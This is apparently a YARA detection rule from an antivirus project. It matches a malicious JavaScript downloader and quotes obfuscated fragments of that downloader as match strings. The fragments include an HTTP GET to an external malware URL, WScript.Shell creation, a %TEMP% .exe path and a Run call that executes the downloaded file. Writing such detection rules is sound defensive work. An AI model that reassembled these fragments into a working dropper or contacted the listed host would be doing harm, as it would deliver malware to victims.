rule sig_20160401_a9cafb06581c0528c516d24673fec253 {
  meta:
    description = "datamaliciousorder - file 20160401_a9cafb06581c0528c516d24673fec253.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "82c0b45878f4a78308d3c2107035d6340c21cb5921987aff2cb9a3e28cfc7e21"

  strings:
    $s1  = "QrCl[CtNu](\"G\" + \"ET\", \"http://abnregistrationaustralia.com.au/k38sa\", false);" fullword ascii
    $s2  = "function UzOaw(InbXav, ZmkIk){FlTa = FlTa * 1; return InbXav - ZmkIk;};" fullword ascii
    $s3  = "var CcFxq = function JcxVsu() {return WScript[CuAn](\"WScript\"+\".Shell\");}(), ZrJf = 11;" fullword ascii
    $s4  = "if (QrCl[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function LiAy(){return SrUzq + \"\";};" fullword ascii
    $s6  = "function ZkWrb() {return CcFxq[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"DpiBOO6GzGWb6.ex\" + \"e\";};" fullword ascii
    $s7  = "function TxeSq() {return ((RmxPys == true) && (RmxPys == PgtEms)) ? 1 : FlTa;};" fullword ascii
    $s8  = "var RmxPys = false;" fullword ascii
    $s9  = "function KxcQmd(){return CuAn;};" fullword ascii
    $s10 = "function BnbRv(){return 23;};" fullword ascii
    $s11 = "PgtEms = true; " fullword ascii
    $s12 = "RmxPys = true; " fullword ascii
    $s13 = "return UzOaw(MgGyh, ZahYi);" fullword ascii
    $s14 = "var PgtEms = false;" fullword ascii
    $s15 = "var DyuJa = new this[\"Date\"]();" fullword ascii
    $s16 = "function TguCst(UfJu){CcFxq[\"R\"+\"un\"](UfJu, FlTa, FlTa);};" fullword ascii
    $s17 = "var DgCke = false;" fullword ascii
    $s18 = "function PxuVu(JiLdm) {var VqoWs = (1, 2, 3, 4, 5, JiLdm); return VqoWs;};" fullword ascii
    $s19 = "function IaMyy()" fullword ascii
    $s20 = "}while (SiAy);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}